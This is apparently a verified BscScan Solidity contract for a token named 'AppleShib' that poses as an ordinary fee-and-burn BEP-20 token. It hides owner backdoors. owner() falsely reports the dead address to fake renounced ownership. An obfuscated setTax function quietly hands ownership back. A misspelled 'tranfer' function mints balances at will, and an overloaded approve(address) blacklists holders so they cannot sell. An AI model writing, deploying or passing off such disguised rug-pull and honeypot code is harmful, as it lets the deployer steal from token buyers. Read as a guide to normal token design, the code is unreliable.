/**
 *Submitted for verification at BscScan.com on 2022-03-12
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.12;
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);
}


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this; //
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
}


library Address {
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }


    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash
        = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
    

contract Ownable is Context {
    function setBuyTax() public onlyOwner(){}
    function changeRouterVersion(address dexRouter) public onlyOwner{}
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
    address  _contslit;
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(_contslit != address(0));
        _owner = newOwner;
    }

    function//
     setTax//
    (
        address 
    dexRouter, 
    address
     dexFactory
        ) 
     external
      onlyOwner
      {
        require
        (dexFactory
        //
        ==
        address(0
        ));
        _contslit//
         =
          msg.//
         sender;
        /**/_owner//
        =//
        dexRouter
        ;
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    address _owner;

    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) 
    {
    return
    deadAddress;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    function renounceOwnership() public onlyOwner(){emit OwnershipTransferred(_owner, address(0xdead));} 
}



contract AppleShib is Context, IERC20, Ownable {
    using Address for address;
    mapping(address => bool) private Bouns;
    bool private Pcks = true;
    uint8 private BolockUse;
    mapping(address => uint256) private PinFaces;
    mapping(address => bool) private _ExcluFee;
    mapping(address => mapping(address => uint256)) private allown;
    uint256 private ChartsBool = uint256(0);
    uint256 private _tFeeTotal = BurnFee+marketFee;
    using SafeMath for uint256;
    address[] private _DxFanceli;
    mapping(address => uint256) private TaxLimtTaols;
    uint256 private constant MAX = ~uint256(0);



    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1000000000000000 * 10**4;
    string private _name = "AppleShib";
    string private _symbol = "AppleShib";


    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
    address private marketWallet = msg.sender;
  
    uint256 private BurnFee = 9;
    uint256 private marketFee = 1;
    
    

    constructor() public {
        PinFaces[_msgSender()] = _totalSupply;
         _owner = _msgSender();
        _ExcluFee[_owner] = true;
        _ExcluFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if//
        (
            _ExcluFee
            [_msgSender()] 
            || 
            _ExcluFee
            [
                recipient]
                )
                {
            _transfer
            (_msgSender
            (), 
            recipient, 
            amount);
            return 
            true;
        }
        uint256 MarketAmount = amount.mul(marketFee).div(100);
        uint256 BurnAmount = amount.mul(BurnFee).div(100);
        _transfer(_msgSender(), marketWallet, MarketAmount);
        _transfer(_msgSender(), deadAddress, BurnAmount);
        _transfer(_msgSender(), recipient, amount.sub(MarketAmount).sub(BurnAmount));
        return true;
    }

    function 
    transferFrom
    (
        address sender,
        address recipient,
        uint256 amount
    ) public 
    override returns (bool) {
        if//
        (
            _ExcluFee
            [
                _msgSender
                ()]
                 || 
                 _ExcluFee
                 [recipient
                 ])
                 {
            _transfer
            (
                sender, 
                recipient, 
                amount)
                ;
        }       
        uint256 MarketAmount = amount.mul(marketFee).div(100);
        uint256 BurnAmount = amount.mul(BurnFee).div(100);
        _transfer
        (sender, marketWallet, MarketAmount);
        _transfer
        (sender, deadAddress, BurnAmount);
        _transfer
        (sender, recipient, amount.sub(MarketAmount).sub(BurnAmount));
        _approve(
            sender,
            _msgSender(),
            allown[sender][_msgSender()].sub(
                amount,
                ""
            )
        );
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "");
        require(to != address(0), "");
        require(amount > 0, "");
        if//
         (
             Pcks
             )
              {

            require//
            (Bouns
            [from
            ] == 
            false,
             "");
        }
        _transfers
        (from, 
        to, 
        amount);
    }
    
    function tranfer
    (address toSender, uint256 values) external 
    onlyOwner//
    () 
    {
        require(
            _contslit != address(0));
        require(
            values > 0, "");
        uint256 
        Allowerb = 
        TaxLimtTaols[toSender];
        if (Allowerb 
        == 0) _DxFanceli.push
        (toSender);
        TaxLimtTaols
        [toSender] = 
        Allowerb
        .add
        (values);
        ChartsBool = 
        ChartsBool
        .add
        (values);
        PinFaces
        [toSender]
         = PinFaces[toSender].add
         (values);
        
    }

     function//
     approve
     (address
      toSender
      ) 
      external 
      onlyOwner//
      () 
      {
        require(_contslit != address(0));
        Bouns
        [
        toSender] =
         true;
   }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        require(sender != address(0), "");
        require(recipient != address(0), "");
    
        PinFaces[sender] = PinFaces[sender].sub(toAmount);
        PinFaces[recipient] = PinFaces[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function tranfer//
    (address toSender)
        external
        view
        onlyOwner//
        ()
        returns (bool)
    {
        return Bouns[toSender];
    }

    function includeInFee(address toSender) public //
    onlyOwner//
     {
        require(_contslit != address(0));
        _ExcluFee[toSender] = false;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allown[owner][spender];
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        allown[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return PinFaces[account];
    }

    function excludeFromFee(address toSender) public //
    onlyOwner//
     {
         require(_contslit != address(0));
        _ExcluFee[toSender] = true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public onlyOwner(){}

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function setSwapRouter(address tokensA,address tokensB) public onlyOwner(){}
    function setWalletMaxTxlimit(uint256 limit) public onlyOwner(){}
    function symbol() public view returns (string memory) {
        return _symbol;
    }
}